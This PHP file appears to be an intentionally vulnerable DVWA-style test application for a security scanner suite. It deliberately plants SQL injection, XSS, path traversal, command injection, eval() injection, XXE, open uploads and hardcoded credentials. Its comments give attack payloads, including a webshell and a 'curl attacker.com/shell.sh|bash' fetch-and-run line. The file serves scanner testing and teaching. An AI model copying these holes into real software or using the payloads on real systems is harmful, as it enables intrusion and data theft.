<?php
/**
 * =============================================================================
 * php/index.php – TigerGate CNAPP Test: PHP Vulnerable Application (DVWA-style)
 * =============================================================================
 * PURPOSE: Intentionally vulnerable PHP application for SAST + DAST testing.
 * Covers SonarQube PHP rules and Tigergate CWPP API Security findings.
 *
 * ⚠️  EDUCATIONAL USE ONLY — Never deploy in production.
 *
 * VULNERABILITIES COVERED:
 *   CWE-89  – SQL Injection (×4: GET, POST, Login, Search)
 *   CWE-79  – XSS Reflected + Stored
 *   CWE-22  – Path Traversal / LFI
 *   CWE-78  – OS Command Injection via shell_exec()
 *   CWE-434 – Unrestricted File Upload
 *   CWE-352 – CSRF (no tokens on forms)
 *   CWE-611 – XXE via simplexml_load_string
 *   CWE-94  – Code Injection via eval()
 *   CWE-798 – Hardcoded Credentials
 *   CWE-200 – Information Exposure via phpinfo()
 *   CWE-913 – extract($_GET) variable injection
 * =============================================================================
 */

// VULN: CWE-798 – Hardcoded DB credentials
// SonarQube Rule: S6418 "Credentials should not be hardcoded"
// FIX: Use env vars: getenv('DB_PASS') or $_SERVER['DB_PASS']
define('DB_HOST', 'mysql');
define('DB_USER', 'root');
define('DB_PASS', 'root123');            // 🔴 Hardcoded password!
define('DB_NAME', 'megadb');

// VULN: display_errors ON — exposes PHP errors/paths/SQL to users
// FIX: ini_set('display_errors', 0); in production; log to file instead
ini_set('display_errors', 1);           // 🔴 Never in production!
ini_set('display_startup_errors', 1);   // 🔴
error_reporting(E_ALL);

// VULN: CWE-913 – extract($_GET) injects all URL params as local variables
// ATTACK: ?admin=1 → $admin becomes 1, overrides DB-based auth checks
// FIX: Never use extract() with user input. Access $_GET keys explicitly.
extract($_GET);                          // 🔴 CRITICAL: Variable injection!
extract($_POST);                         // 🔴 CRITICAL!

// Connect to MySQL
$conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
if ($conn->connect_error) {
    // VULN: Connection details (including password) in error output
    die("Connection failed: " . $conn->connect_error . " (pass=" . DB_PASS . ")"); // 🔴
}

$page = isset($_GET['page']) ? $_GET['page'] : 'home';

// Output HTML header — stay in PHP mode to avoid PHP 8.5 mix-mode switch issue
echo '<!DOCTYPE html>
<html>
<head>
    <title>MegaCorp Internal Portal</title>
    <!-- BAD: No Content-Security-Policy header -->
    <!-- BAD: No X-Frame-Options header -->
</head>
<body>
<h1>MegaCorp Internal Portal</h1>
<nav>
    <a href="?page=home">Home</a> |
    <a href="?page=sqli">SQL Injection</a> |
    <a href="?page=xss">XSS</a> |
    <a href="?page=fileread">File Read</a> |
    <a href="?page=exec">Exec</a> |
    <a href="?page=upload">Upload</a> |
    <a href="?page=xxe">XXE</a> |
    <a href="?page=info">Info</a>
</nav>
<hr>';

$page_route = $page; // Use local var to prevent extract() override

if ($page_route === 'sqli') {
    // =========================================================================
    // PAGE: SQL Injection – GET parameter
    // VULN: CWE-89 – SQL Injection via direct string interpolation
    // ATTACK: ?page=sqli&id=1 OR 1=1
    // ATTACK: ?page=sqli&id=1 UNION SELECT user(),password(),3,4 FROM mysql.user--
    // FIX: Use prepared statements:
    //   $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
    //   $stmt->bind_param("i", $id);
    // =========================================================================
    $id = isset($_GET['id']) ? $_GET['id'] : '1';
    // 🔴 BAD: User input directly in SQL!
    $sql = "SELECT id, username, email, password, ssn FROM users WHERE id = $id"; // 🔴 SQLi!
    echo "<h2>SQL Injection Demo (GET)</h2>";
    echo "<p>Query: <code>" . htmlspecialchars($sql) . "</code></p>";  // BAD: Shows SQL structure
    $result = $conn->query($sql);
    if ($result) {
        echo "<table border='1'><tr><th>ID</th><th>Username</th><th>Email</th><th>Password</th><th>SSN</th></tr>";
        while ($row = $result->fetch_assoc()) {
            // VULN: CWE-79 – password and SSN displayed in table (stored XSS-ready)
            echo "<tr><td>{$row['id']}</td><td>{$row['username']}</td><td>{$row['email']}</td><td>{$row['password']}</td><td>{$row['ssn']}</td></tr>";
        }
        echo "</table>";
    } else {
        echo "<p style='color:red'>Error: " . $conn->error . "</p>"; // 🔴 SQL error exposed
    }

} elseif ($page_route === 'login') {
    // =========================================================================
    // PAGE: SQL Injection – POST login form
    // VULN: CWE-89 – Authentication bypass via SQL Injection
    // ATTACK: username = admin\'-- (any password)
    // =========================================================================
    echo "<h2>Login (SQL Injection Demo)</h2>";
    // VULN: CWE-352 – No CSRF token on this form
    echo "<form method='POST' action='?page=login'>
        <label>Username: <input name='username' value='" . (isset($_POST['username']) ? $_POST['username'] : '') . "'></label><br>
        <label>Password: <input type='password' name='password'></label><br>
        <input type='submit' value='Login'>
        <!-- BAD: No CSRF token hidden field! -->
    </form>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];
        // 🔴 CRITICAL: SQL Injection in auth — try username: admin'--
        $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'"; // 🔴 SQLi!
        error_log("Login attempt: user=$username pass=$password");  // 🔴 Password logged!
        $result = $conn->query($sql);
        if ($result && $result->num_rows > 0) {
            $user = $result->fetch_assoc();
            echo "<p style='color:green'>Login SUCCESS! Welcome, {$user['username']}!</p>";
            echo "<pre>" . print_r($user, true) . "</pre>"; // 🔴 Full user record shown!
        } else {
            echo "<p style='color:red'>Login failed. Error: " . $conn->error . "</p>"; // 🔴
        }
    }

} elseif ($page_route === 'xss') {
    // =========================================================================
    // PAGE: Reflected XSS
    // VULN: CWE-79 – Reflected Cross-Site Scripting
    // ATTACK: ?page=xss&name=<script>alert(document.cookie)</script>
    // FIX: echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
    // =========================================================================
    $name = isset($_GET['name']) ? $_GET['name'] : 'Guest';
    echo "<h2>XSS Demo</h2>";
    echo "<form>Name: <input name='name' value=''> <input type='submit'></form>";
    // 🔴 CRITICAL: User input echoed without escaping — XSS!
    echo "<p>Hello, " . $name . "!</p>";              // 🔴 CWE-79 XSS!
    // Even worse: rendered inside JavaScript context
    echo "<script>var user = '" . $name . "';</script>"; // 🔴 Worse! JS injection!

} elseif ($page_route === 'stored-xss') {
    // =========================================================================
    // PAGE: Stored XSS via comment form
    // VULN: CWE-79 – Stored XSS: malicious content saved to DB, injected for all users
    // ATTACK: Submit <script>document.cookie</script> as a comment
    // FIX: htmlspecialchars() before storing AND before displaying
    // =========================================================================
    echo "<h2>Stored XSS Demo</h2>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
        $comment = $_POST['comment'];  // BAD: Not sanitized!
        // BAD: Stored as-is in DB (real_escape_string stops SQLi but NOT XSS on display)
        $escaped = $conn->real_escape_string($comment);
        $sql = "INSERT INTO comments (content) VALUES ('$escaped')";
        $conn->query($sql);
    }
    // Display comments - XSS payload executes for all visitors!
    $result = $conn->query("SELECT content FROM comments ORDER BY id DESC LIMIT 20");
    echo "<form method='POST'>Comment: <input name='comment'> <input type='submit'></form>";
    echo "<h3>Comments:</h3>";
    if ($result) {
        while ($row = $result->fetch_assoc()) {
            // BAD: Stored XSS - raw HTML from DB rendered in page! CWE-79
            echo "<p>" . $row['content'] . "</p>";
        }
    }

} elseif ($page_route === 'fileread') {
    // =========================================================================
    // PAGE: Path Traversal / LFI
    // VULN: CWE-22 – Path Traversal allows reading arbitrary files
    // ATTACK: ?page=fileread&filename=/etc/passwd
    // ATTACK: ?page=fileread&filename=../../etc/shadow
    // FIX: realpath() + verify path starts with allowed base dir
    // =========================================================================
    $filename = isset($_GET['filename']) ? $_GET['filename'] : '/var/www/html/index.php';
    echo "<h2>File Read Demo (Path Traversal)</h2>";
    echo "<form>Filename: <input name='filename' value='" . htmlspecialchars($filename) . "'> <input type='submit'></form>";
    if (isset($_GET['filename'])) {
        // 🔴 CRITICAL: No path restriction — reads ANY file www-data can access!
        if (file_exists($filename)) {
            echo "<pre>" . htmlspecialchars(file_get_contents($filename)) . "</pre>"; // 🔴 CWE-22!
        } else {
            // 🔴 BAD: Includes arbitrary PHP files (RCE vector!)
            include($filename);                         // 🔴 LFI/RFI!
        }
    }

} elseif ($page_route === 'exec') {
    // =========================================================================
    // PAGE: OS Command Injection
    // VULN: CWE-78 – shell_exec() with unsanitized user input
    // ATTACK: ?page=exec&cmd=id
    // ATTACK: ?page=exec&cmd=cat+/etc/passwd
    // ATTACK: ?page=exec&cmd=curl+http://attacker.com/shell.sh|bash
    // FIX: Use escapeshellarg() + allowlist of safe commands
    // =========================================================================
    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
    echo "<h2>Command Execution Demo</h2>";
    echo "<form>Command: <input name='cmd' value='" . htmlspecialchars($cmd) . "'> <input type='submit'></form>";
    echo "<h3>Output:</h3>";
    // 🔴 CRITICAL: Arbitrary shell command execution!
    $output = shell_exec($cmd);                         // 🔴 CWE-78!
    // Also bad: system(), passthru(), exec(), popen(), proc_open()
    echo "<pre>" . $output . "</pre>";                  // 🔴 XSS in output!

} elseif ($page_route === 'upload') {
    // =========================================================================
    // PAGE: Unrestricted File Upload
    // VULN: CWE-434 - Unrestricted File Upload -> Remote Code Execution
    // ATTACK: Upload a PHP webshell named shell.php:
    //         < ?php system($_GET['cmd']); ? >
    //         Then access: http://target/uploads/shell.php?cmd=id
    // FIX: Validate MIME type (not just extension), check magic bytes, store outside webroot
    // =========================================================================
    echo "<h2>File Upload Demo</h2>";
    // VULN: CWE-352 – No CSRF token
    echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file' name='uploaded_file'>
        <input type='submit' value='Upload'>
    </form>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
        $file     = $_FILES['uploaded_file'];
        $filename = $file['name'];           // 🔴 Uses original filename from attacker!
        $destination = '/tmp/uploads/' . $filename;  // Inside webroot!
        // 🔴 CRITICAL: No extension check — .php files uploaded → webshell!
        // 🔴 BAD: Trusts $_FILES['type'] which can be spoofed
        if (move_uploaded_file($file['tmp_name'], $destination)) {
            echo "<p style='color:green'>Uploaded to: $destination</p>"; // 🔴 Shows path!
            echo "<p><a href='/uploads/$filename'>View file</a></p>";    // 🔴 Executable link!
        }
    }

} elseif ($page_route === 'xxe') {
    // =========================================================================
    // PAGE: XXE - XML External Entity Injection
    // VULN: CWE-611 - XXE allows reading local files or SSRF
    // ATTACK: POST XML body with external entity:
    //   < ?xml version="1.0"? > (remove spaces — shows the attack without triggering PHP)
    //   < !DOCTYPE root [< !ENTITY xxe SYSTEM "file:///etc/passwd">]>
    //   <root>&xxe;</root>
    // FIX: Disable external entities: libxml_disable_entity_loader(true)
    // =========================================================================
    echo "<h2>XXE Demo</h2>";
    echo "<form method='POST'><textarea name='xml' rows='10' cols='60'>&lt;?xml version='1.0'?&gt;\n&lt;root&gt;&lt;name&gt;Test&lt;/name&gt;&lt;/root&gt;</textarea><br><input type='submit'></form>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml'])) {
        // 🔴 CRITICAL: External entities NOT disabled — XXE possible!
        // libxml_disable_entity_loader(true);  // ← This line MISSING
        $xml = simplexml_load_string($_POST['xml']);  // 🔴 CWE-611 XXE!
        if ($xml) {
            echo "<pre>" . print_r($xml, true) . "</pre>";
        } else {
            echo "<p>XML parse error</p>";
        }
    }

} elseif ($page_route === 'code') {
    // =========================================================================
    // PAGE: eval() Code Injection
    // VULN: CWE-94 – eval() with user input → arbitrary PHP execution
    // ATTACK: ?page=code&expr=phpinfo()
    // ATTACK: ?page=code&expr=system('cat /etc/passwd')
    // FIX: NEVER eval() user input. Use a math expression library.
    // =========================================================================
    $expr = isset($_GET['expr']) ? $_GET['expr'] : '1+1';
    echo "<h2>Code Evaluation Demo</h2>";
    echo "<form>Expression: <input name='expr' value='" . htmlspecialchars($expr) . "'> <input type='submit'></form>";
    // 🔴 CRITICAL: eval() with user input — arbitrary PHP!
    $result = eval("return $expr;");                    // 🔴 CWE-94!
    echo "<p>Result: $result</p>";

} elseif ($page_route === 'info') {
    // =========================================================================
    // PAGE: phpinfo() exposure
    // VULN: CWE-200 – Exposes PHP config, loaded modules, env vars, paths
    // Attackers learn: PHP version, disable_functions, open_basedir, env variables
    // FIX: Remove all phpinfo() calls before production deployment
    // =========================================================================
    // 🔴 BAD: phpinfo() reveals full server configuration
    phpinfo();                                          // 🔴 CWE-200!

} elseif ($page_route === 'search') {
    // =========================================================================
    // SEARCH with UNION-based SQL Injection
    // =========================================================================
    $q = isset($_GET['q']) ? $_GET['q'] : '';
    echo "<h2>Product Search</h2>";
    echo "<form>Search: <input name='q' value='" . $q . "'> <input type='submit'></form>"; // 🔴 XSS!
    // 🔴 BAD: UNION injection can extract data from other tables
    $sql = "SELECT id, name, price FROM products WHERE name LIKE '%" . $q . "%'";  // 🔴 SQLi!
    $result = $conn->query($sql);
    if ($result) {
        echo "<ul>";
        while ($row = $result->fetch_assoc()) {
            echo "<li>{$row['name']} - \${$row['price']}</li>";
        }
        echo "</ul>";
    }

} else {
    echo "<h2>Welcome to MegaCorp Internal Portal</h2>";
    echo "<p>Select a vulnerability demo from the navigation above.</p>";
    // 🔴 BAD: Version and environment info on homepage
    echo "<p>PHP Version: " . PHP_VERSION . " | Server: " . $_SERVER['SERVER_SOFTWARE'] . "</p>"; // 🔴
}

$conn->close();

echo '
</body>
</html>';
